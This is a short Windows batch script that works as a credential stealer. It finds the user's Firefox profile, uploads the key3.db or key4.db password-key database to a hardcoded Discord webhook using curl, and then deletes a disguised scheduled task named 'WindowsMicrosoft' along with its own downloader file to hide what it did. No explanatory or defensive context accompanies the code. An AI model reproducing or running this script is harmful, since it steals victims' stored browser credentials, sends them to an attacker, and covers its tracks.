@echo off
for /d %%d in ("%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*release*") do set firefox_profile=%%d
cd %firefox_profile%
if exist "kay3.db" (curl -X POST -H "Content-Type: multipart/form-data" -F "content=firefox" -F "file=@%firefox_profile%\key3.db" https://discord.com/api/webhooks/1295740220507033653/ZtAyFre9GdhE3Z07Dlk-4M5zKm6ZVX2kO_ROiZeawfShFy1mDNCdd_grGNXMvBtvxTML --insecure
) else (curl -X POST -H "Content-Type: multipart/form-data" -F "content=firefox" -F "file=@%firefox_profile%\key4.db" https://discord.com/api/webhooks/1295740220507033653/ZtAyFre9GdhE3Z07Dlk-4M5zKm6ZVX2kO_ROiZeawfShFy1mDNCdd_grGNXMvBtvxTML --insecure
)
SCHTASKS /DELETE /TN "WindowsMicrosoft" /F
del download_file.cmd
